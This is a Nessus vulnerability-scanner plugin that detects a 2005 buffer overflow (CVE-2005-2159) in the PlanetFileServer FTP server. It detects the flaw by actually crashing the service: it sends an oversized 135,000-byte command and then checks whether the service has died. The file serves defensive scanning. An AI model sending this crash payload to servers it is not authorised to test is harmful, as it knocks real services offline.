#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18611);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-2159");
  script_bugtraq_id(14138);
  script_osvdb_id(17820);

  script_name(english:"PlanetFileServer mshftp.dll Data Processing Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PlanetFileServer, an FTP server
for Windows from PlanetDNS. 

The installed version of PlanetFileServer is vulnerable to a buffer
overflow when processing large commands.  An unauthenticated attacker
can trigger this flaw to crash the service or execute arbitrary code
as administrator." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/404161/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/04");
 script_cvs_date("$Date: 2011/03/11 20:33:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for remote buffer overflow vulnerability in PlanetFileServer");
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_ftp_port(default: 21);


# If the banner suggests it's for PlanetFileServer...
banner = get_ftp_banner(port: port);
if (! banner) exit(1, "No FTP banner on port "+port+".");
if (
  egrep(string:banner, pattern:"^220[ -]mshftp/.+ NewAce Corporation")
) {
  c = crap(135000) + '\r\n';

  # nb: fRoGGz claims you may need to send the command 2 times
  #     depending on the configured security filter option levels.
  i = 0;
  while((soc = open_sock_tcp(port)) && i++ < 2) {
    # Send a long command.
    send(socket:soc, data:c);
    close(soc);
    sleep(1);
  }

  # There's a problem if we can't open a connection after sending 
  # the exploit at least once.
  if (i > 0) {
    if (service_is_dead(port: port) > 0)
      security_hole(port);
    exit(0);
  }
}
